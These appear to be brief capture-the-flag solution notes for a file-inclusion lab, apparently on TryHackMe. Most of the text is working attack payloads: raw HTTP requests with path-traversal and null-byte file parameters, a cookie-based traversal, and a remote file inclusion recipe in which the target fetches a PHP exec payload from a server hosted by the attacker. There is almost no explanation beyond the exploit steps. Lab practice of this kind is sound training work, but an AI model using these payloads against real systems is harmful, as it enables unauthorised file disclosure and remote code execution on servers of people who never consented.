flag1
```
POST /challenges/chall1.php HTTP/1.1
Host: 10.10.32.180
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 26
Content-Type: application/x-www-form-urlencoded
file=../../../../etc/flag1
```

flag2
```
change cookie "THM" to admin, then refresh and change cookie "THM" to ../../../../etc/flag2%00
```

flag3
```
POST /challenges/chall3.php HTTP/1.1
Host: 10.10.32.180
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
file=../../../../etc/flag3%00
```

flag4 (rfi)
```
1. nano rfi.txt
2. paste: "<?PHP print exec('hostname'); ?>", save and exit
3. python3 -m http.server 9090
4. get IP addr of current machine (one we are attacking from) 
5. in address bar type this:
<target_ip>/playground.php?file=http://<our_ip>:9090/rfi.txt
we will get flag
```